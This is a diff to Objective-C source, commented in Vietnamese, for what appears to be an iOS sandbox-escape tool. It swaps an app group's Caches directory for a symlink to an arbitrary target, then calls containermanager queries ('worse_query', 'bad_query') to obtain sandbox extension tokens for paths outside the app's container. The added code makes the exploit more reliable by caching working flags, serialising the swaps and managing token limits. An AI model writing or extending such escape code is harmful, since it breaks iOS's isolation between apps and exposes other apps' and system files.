@@ -12,6 +12,7 @@
 #import <sys/mount.h>
 #import <sys/stat.h>
 #import <sys/stdio.h>
+#import <sys/xattr.h>
 #import <unistd.h>
 #import <xpc/xpc.h>
 
@@ -187,6 +188,143 @@ static NSArray<NSNumber *> *BQClass7FlagCandidates(void) {
         return @[@0x8000000000ULL, @0x0800000000ULL];
     }
     return @[@0x0800000000ULL, @0x8000000000ULL];
+}
+
+// ------------------------------------------------- worse_query hardening ---
+
+/// Chuẩn hoá đường dẫn như worse_query yêu cầu: /var → /private/var.
+static NSString *BQNormPath(NSString *path) {
+    if (!path.length) return path;
+    NSString *normalized = path.stringByStandardizingPath;
+    if ([normalized hasPrefix:@"/var/"]) {
+        normalized = [@"/private" stringByAppendingString:normalized];
+    }
+    return normalized;
+}
+
+/// Token coi như thành công trừ khi sandbox trả EPERM — EACCES là quyền file
+/// (container của root), token không thay đổi được.
+static BOOL BQTokenOpensPath(NSString *path) {
+    struct stat st;
+    if (lstat(path.fileSystemRepresentation, &st) != 0) return NO;
+    int fd = open(path.fileSystemRepresentation, O_RDONLY | O_NOFOLLOW | O_NONBLOCK | O_CLOEXEC);
+    if (fd >= 0) {
+        close(fd);
+        return YES;
+    }
+    return errno != EPERM;
+}
+
+/// Nhớ bộ flag class-7 chạy được trên máy này (1 lần thử thay vì 2).
+static int gClass7AltPreference = -1;
+
+/// worse_query hoán đổi Library/Caches của app group — tuần tự hoá để hai
+/// luồng không swap chồng nhau.
+static NSRecursiveLock *gClass7Lock;
+
+/// Kernel giới hạn số sandbox extension mỗi tiến trình; giữ bộ token sống có
+/// hạn, token cũ bị thu hồi và sẽ được grant lại khi cần.
+static const NSUInteger kBQMaxLiveHandles = 160;
+static NSMutableArray<NSNumber *> *gLiveHandles;
+
+static void BQTrackHandle(int64_t handle) {
+    if (handle < 0) return;
+    if (!gLiveHandles) gLiveHandles = [NSMutableArray array];
+    [gLiveHandles addObject:@(handle)];
+    while (gLiveHandles.count > kBQMaxLiveHandles) {
+        int64_t oldest = gLiveHandles.firstObject.longLongValue;
+        [gLiveHandles removeObjectAtIndex:0];
+        if (BQShared()->sandboxRelease) BQShared()->sandboxRelease(oldest);
+        if (gEscapePaths) [gEscapePaths removeObjectForKey:@(oldest)];
+    }
+}
+
+static void BQUntrackHandle(int64_t handle) {
+    if (handle < 0 || !gLiveHandles) return;
+    [gLiveHandles removeObject:@(handle)];
+}
+
+static NSDictionary<NSString *, NSString *> *BQContainerIdentifierMap(void);
+
+/// Identifier của container: xattr (nhanh) → map containermanager (không cần
+/// quyền file) → metadata plist (thường root-only nên chỉ là chốt cuối).
+static NSString *BQIdentifierForContainer(NSString *path) {
+    if (!path.length) return nil;
+    NSString *dir = BQNormPath(path);
+
+    char buffer[512];
+    ssize_t length = getxattr(dir.fileSystemRepresentation,
+                              "com.apple.containermanager.identifier",
+                              buffer, sizeof(buffer) - 1, 0, 0);
+    if (length > 0) {
+        buffer[length] = 0;
+        return [NSString stringWithUTF8String:buffer];
+    }
+
+    NSString *fromMap = BQContainerIdentifierMap()[dir];
+    if (fromMap.length) return fromMap;
+
+    NSString *metadata = [dir stringByAppendingPathComponent:@".com.apple.mobile_container_manager.metadata.plist"];
+    NSData *data = [NSData dataWithContentsOfFile:metadata];
+    if (data.length) {
+        NSDictionary *plist = [NSPropertyListSerialization propertyListWithData:data
+                                                                       options:0
+                                                                        format:NULL
+                                                                         error:nil];
+        id identifier = [plist isKindOfClass:NSDictionary.class] ? plist[@"MCMMetadataIdentifier"] : nil;
+        if ([identifier isKindOfClass:NSString.class] && [identifier length]) {
+            return identifier;
+        }
+    }
+    return nil;
+}
+
+/// Map path → identifier qua containermanager cho mọi class container.
+/// Cache 60 giây vì label được hỏi cho từng dòng.
+static NSDictionary<NSString *, NSString *> *BQContainerIdentifierMap(void) {
+    static NSDictionary<NSString *, NSString *> *cached;
+    static NSTimeInterval cachedAt;
+    static NSLock *lock;
+    static dispatch_once_t once;
+    dispatch_once(&once, ^{ lock = [NSLock new]; });
+
+    [lock lock];
+    NSTimeInterval now = NSDate.date.timeIntervalSinceReferenceDate;
+    if (cached && now - cachedAt < 60) {
+        NSDictionary *result = cached;
+        [lock unlock];
+        return result;
+    }
+
+    NSMutableDictionary<NSString *, NSString *> *map = [NSMutableDictionary dictionary];
+    BQAPI *api = BQShared();
+    if (api->queryCreate && api->querySetClass && api->queryIterate &&
+        api->objectGetPath && api->objectGetIdentifier) {
+        const uint64_t classes[] = { 0, 2, 5, 7, 8, 10, 11, 13 };
+        for (size_t index = 0; index < sizeof(classes) / sizeof(classes[0]); index++) {
+            void *query = api->queryCreate();
+            if (!query) continue;
+            api->querySetClass(query, classes[index]);
+            api->queryIterate(query, ^bool(void *object) {
+                if (!object) return true;
+                const char *pathC = api->objectGetPath(object);
+                const char *identifierC = api->objectGetIdentifier(object);
+                if (!pathC || !pathC[0] || !identifierC || !identifierC[0]) return true;
+                NSString *containerPath = [NSString stringWithUTF8String:pathC];
+                NSString *identifier = [NSString stringWithUTF8String:identifierC];
+                if (containerPath.length && identifier.length) {
+                    map[BQNormPath(containerPath)] = identifier;
+                }
+                return true;
+            });
+            api->queryFree(query);
+        }
+    }
+
+    cached = map;
+    cachedAt = now;
+    [lock unlock];
+    return cached;
 }
 
 // ---------------------------------------------------------------- helpers ---
@@ -367,6 +505,7 @@ static void BQRecordEscape(int64_t handle, NSString *path) {
         gEscapePaths = [NSMutableDictionary dictionary];
     });
     gEscapePaths[@(handle)] = path;
+    BQTrackHandle(handle);
 }
 
 /// bad_query file form: class 13 against the MobileGestalt SystemGroup with an
@@ -490,42 +629,62 @@ static int64_t BQEscapeClass7Symlink(NSString *target) {
     NSArray<NSString *> *groupIDs = BQReadAppGroupEntitlement();
     if (!groupIDs.count) return -6;
 
-    NSFileManager *fm = [NSFileManager defaultManager];
-    for (NSString *groupID in groupIDs) {
-        NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
-        NSString *groupRoot = groupURL.path;
-        if (!groupRoot.length) continue;
+    target = BQNormPath(target);
+    static dispatch_once_t lockOnce;
+    dispatch_once(&lockOnce, ^{
+        if (!gClass7Lock) gClass7Lock = [NSRecursiveLock new];
+    });
+    [gClass7Lock lock];
+    @try {
+        NSFileManager *fm = [NSFileManager defaultManager];
+        for (NSString *groupID in groupIDs) {
+            NSURL *groupURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
+            NSString *groupRoot = groupURL.path;
+            if (!groupRoot.length) continue;
 
-        NSString *library = [groupRoot stringByAppendingPathComponent:@"Library"];
-        NSString *caches = [library stringByAppendingPathComponent:@"Caches"];
-        NSString *backup = [library stringByAppendingPathComponent:@"Caches.bqtool"];
-        [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];
-        BQRecoverPath(caches, backup);
-        if (![fm fileExistsAtPath:caches]) {
-            [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
-        }
-        if (!BQSwapPathWithSymlink(caches, target, backup)) {
-            BQRestorePath(caches, backup);
-            continue;
-        }
-
-        NSArray<NSNumber *> *flagCandidates = BQClass7FlagCandidates();
-        for (NSNumber *flags in flagCandidates) {
-            NSString *path = nil;
-            int64_t handle = BQQueryEscape(7, groupID, YES, 3, @"",
-                                           flags.unsignedLongLongValue,
-                                           [NSString stringWithFormat:@"worse_query/class7-symlink/0x%llx/%@",
-                                            flags.unsignedLongLongValue, groupID],
-                                           &path);
-            if (handle >= 0 && BQCanOpenDirectory(target)) {
-                gEscapeGroupRoot = groupRoot;
-                BQRecordEscape(handle, target);
-                BQLog(@"escape: worse_query (class-7, flags=0x%llx)", flags.unsignedLongLongValue);
-                return handle;
+            NSString *library = [groupRoot stringByAppendingPathComponent:@"Library"];
+            NSString *caches = [library stringByAppendingPathComponent:@"Caches"];
+            NSString *backup = [library stringByAppendingPathComponent:@"Caches.bqtool"];
+            [fm createDirectoryAtPath:library withIntermediateDirectories:YES attributes:nil error:nil];
+            BQRecoverPath(caches, backup);
+            if (![fm fileExistsAtPath:caches]) {
+                [fm createDirectoryAtPath:caches withIntermediateDirectories:YES attributes:nil error:nil];
             }
-            if (handle >= 0 && BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
+            if (!BQSwapPathWithSymlink(caches, target, backup)) {
+                BQRestorePath(caches, backup);
+                continue;
+            }
+
+            NSArray<NSNumber *> *allFlags = BQClass7FlagCandidates();
+            NSMutableArray<NSNumber *> *ordered = [NSMutableArray arrayWithArray:allFlags];
+            if (gClass7AltPreference >= 0) {
+                NSUInteger preferredIndex = gClass7AltPreference == 1 ? ordered.count - 1 : 0;
+                NSNumber *preferred = ordered[preferredIndex];
+                [ordered removeObjectAtIndex:preferredIndex];
+                [ordered insertObject:preferred atIndex:0];
+            }
+
+            for (NSNumber *flags in ordered) {
+                NSString *path = nil;
+                int64_t handle = BQQueryEscape(7, groupID, YES, 3, @"",
+                                               flags.unsignedLongLongValue,
+                                               [NSString stringWithFormat:@"worse_query/class7-symlink/0x%llx/%@",
+                                                flags.unsignedLongLongValue, groupID],
+                                               &path);
+                if (handle >= 0 && BQTokenOpensPath(target)) {
+                    gClass7AltPreference =
+                        (flags.unsignedLongLongValue == allFlags.lastObject.unsignedLongLongValue) ? 1 : 0;
+                    gEscapeGroupRoot = groupRoot;
+                    BQRecordEscape(handle, target);
+                    BQLog(@"escape: worse_query (class-7, flags=0x%llx)", flags.unsignedLongLongValue);
+                    return handle;
+                }
+                if (handle >= 0 && BQShared()->sandboxRelease) BQShared()->sandboxRelease(handle);
+            }
+            BQRestorePath(caches, backup);
         }
-        BQRestorePath(caches, backup);
+    } @finally {
+        [gClass7Lock unlock];
     }
     return -5;
 }
@@ -699,6 +858,16 @@ static int64_t BQEscapeClass2Stage(NSString *target) {
     return [NSString stringWithFormat:
             @"class-2 fallback (không có app group) — độ ổn định tuỳ build · iOS %ld.%ld",
             (long)major, (long)minor];
+}
+
++ (NSString *)routeSummary {
+    if ([self hasMHAIdentity]) return @"MHA-C2";
+    if (BQReadAppGroupEntitlement().count) return @"worse_query";
+    return @"bad_query";
+}
+
++ (NSString *)containerIdentifierAtPath:(NSString *)path {
+    return BQIdentifierForContainer(path);
 }
 
 + (NSArray<NSString *> *)enumerateIdentifiersForClass:(uint64_t)cls
@@ -935,6 +1104,7 @@ static NSString *BQEscapePathForHandle(int64_t handle) {
     BQAPI *api = BQShared();
     if (handle >= 0 && api->sandboxRelease) api->sandboxRelease(handle);
     if (gEscapePaths) [gEscapePaths removeObjectForKey:@(handle)];
+    BQUntrackHandle(handle);
 
     NSString *groupRoot = gEscapeGroupRoot;
     gEscapeGroupRoot = nil;
